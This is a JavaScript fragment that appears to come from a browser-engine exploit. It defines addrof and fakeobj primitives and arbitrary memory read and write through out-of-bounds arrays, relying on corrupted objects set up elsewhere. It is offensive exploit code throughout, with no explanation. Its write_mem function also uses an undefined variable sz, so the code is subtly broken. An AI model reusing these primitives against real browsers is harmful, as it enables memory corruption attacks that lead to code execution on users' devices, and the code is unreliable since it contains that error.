function i48_put(x, a)
{
    a[4] = x | 0;
    a[5] = (x / 4294967296) | 0;
}

function i48_get(a)
{
    return a[4] + a[5] * 4294967296;
}

function addrof(x)
{
    leaker_obj.a = x;
    return i48_get(leaker_arr);
}

function fakeobj(x)
{
    i48_put(x, leaker_arr);
    return leaker_obj.a;
}

function read_mem(p, sz)
{
    i48_put(p, oob_master);
    oob_master[6] = sz;
    var arr = [];
    for(var i = 0; i < sz; i++)
        arr.push(oob_slave[i]);
    return arr;
}

function write_mem(p, data)
{
    i48_put(p, oob_master);
    oob_master[6] = sz;
    for(var i = 0; i < data.length; i++)
        oob_slave[i] = data[i];
}

function read_ptr_at(p)
{
    var ans = 0;
    var d = read_mem(p, 8);
    for(var i = 7; i >= 0; i--)
        ans = 256 * ans + d[i];
    return ans;
}

function write_ptr_at(p, d)
{
    var arr = [];
    for(var i = 0; i < 8; i++)
    {
        arr.push(d & 0xff);
        d /= 256;
    }
    write_mem(p, arr);
}

function hex(x)
{
    return (new Number(x)).toString(16);
}